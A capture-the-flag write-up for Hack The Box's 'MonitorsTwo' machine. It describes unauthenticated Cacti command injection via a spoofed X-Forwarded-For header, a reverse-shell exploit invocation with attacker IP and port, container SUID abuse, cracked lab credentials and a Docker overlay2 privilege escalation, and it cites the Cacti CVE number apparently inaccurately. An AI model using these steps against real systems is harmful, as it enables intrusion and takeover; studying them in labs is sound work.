# MonitorsTwo

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.211 |
| **Status** | Retired |

## Overview
MonitorsTwo (locally tracked as "MonitorTwo") is an Easy Linux machine centered on an outdated Cacti monitoring installation. An unauthenticated remote code execution vulnerability in Cacti is used to obtain a shell inside a Docker container, from which a misconfigured SUID binary grants root inside that container. Credentials recovered from the containerized MySQL database are cracked and reused over SSH to access the host itself, and a vulnerable Docker version is then abused to escalate to full root on the host.

## Reconnaissance
Initial `nmap` scanning showed a minimal Linux web host:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu) - "Login to Cacti"
```

The web root served a Cacti login page, immediately pointing enumeration toward known Cacti CVEs.

## Enumeration
The exposed Cacti version was vulnerable to an unauthenticated command-injection flaw in `remote_agent.php` (reachable via a spoofed `X-Forwarded-For: 127.0.0.1` header, which the endpoint trusts as a local, pre-authorized poller). The vulnerable endpoint accepts `poller_id`/`host_id`/`local_data_ids[]` parameters that are passed unsanitized into a shell command once a valid `host_id`/`local_data_ids` pair is brute-forced.

## Foothold
`files/exploit.py` implements the attack end-to-end:

1. Confirms the target responds to `remote_agent.php` with the spoofed `X-Forwarded-For` header.
2. Brute-forces valid `host_id` (1-4) and `local_data_ids` (1-9) combinations until a `rrd_name` of `polling_time` or `uptime` is returned.
3. Injects a bash reverse-shell one-liner into the `poller_id` parameter, URL-encoded, to achieve command execution.

```bash
python3 exploit.py -u http://<target> --LHOST <attacker_ip> --LPORT <listener_port>
```

The resulting shell landed inside a Docker container running the Cacti/`entrypoint.sh` stack. A SUID `capsh` binary present in the container was leveraged to gain root inside the container, and inspection of the container's MySQL database/config recovered password hashes. Two bcrypt hashes (see `files/hashes.txt`) were cracked, yielding the credentials `marcus:funkymonkey`, which worked over SSH on the actual host.

## Privilege Escalation
Once on the host as `marcus`, further enumeration identified an outdated Docker Engine version vulnerable to **CVE-2021-41091**, which allows a low-privileged local user to traverse into another container's merged overlay filesystem (world-executable permissions on `/var/lib/docker/overlay2/*/merged`). By locating a running container's filesystem, copying out its `bash` binary, and setting the SUID bit on the copy from within the root-owned container context, a SUID `bash` was planted on the host: executing it granted an immediate root shell.

## Lessons Learned
- Trusting `X-Forwarded-For` for "is this a local poller" authorization checks is unsafe: it is fully attacker-controlled.
- SUID binaries left inside container images (like `capsh`) can turn a container compromise into full container-root very quickly.
- Keep Docker Engine patched: CVE-2021-41091 turns a foothold into host root through nothing more than insecure default file permissions on overlay2 directories.

## Tools & References
- `files/exploit.py`: Cacti `remote_agent.php` unauthenticated command injection PoC (brute-forces host/data IDs, then injects a reverse shell).
- `files/hashes.txt`: bcrypt password hashes recovered from the container's database and cracked to obtain `marcus:funkymonkey`.
- Cacti unauthenticated RCE (CVE-2023-39362 class of `remote_agent.php` command injection).
- CVE-2021-41091: Docker Engine insecure permissions on container `overlay2` merged directories, used for host privilege escalation.
